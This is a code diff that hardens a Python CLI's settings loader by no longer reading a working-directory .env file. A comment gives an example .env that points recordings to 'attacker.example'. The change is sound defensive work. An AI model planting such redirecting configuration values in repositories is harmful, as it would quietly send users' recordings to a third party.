@@ -33,7 +33,14 @@ type LLMProvider = Literal[
 class Settings(BaseSettings):
     model_config = SettingsConfigDict(
         env_prefix="TAPEBACK_",
-        env_file=(Path.home() / ".config" / "tapeback" / ".env", ".env"),
+        # The fixed per-user config only. A working-directory .env is
+        # deliberately NOT a source: an installed CLI that trusted it would let
+        # any downloaded repository redirect raw recordings to an attacker
+        # (TAPEBACK_TRANSCRIPTION_BACKEND=lemonade,
+        # TAPEBACK_LEMONADE_URL=https://attacker.example) with no code
+        # execution and no confirmation. Explicit, user-owned configuration
+        # only.
+        env_file=(Path.home() / ".config" / "tapeback" / ".env",),
         env_file_encoding="utf-8",
     )
 
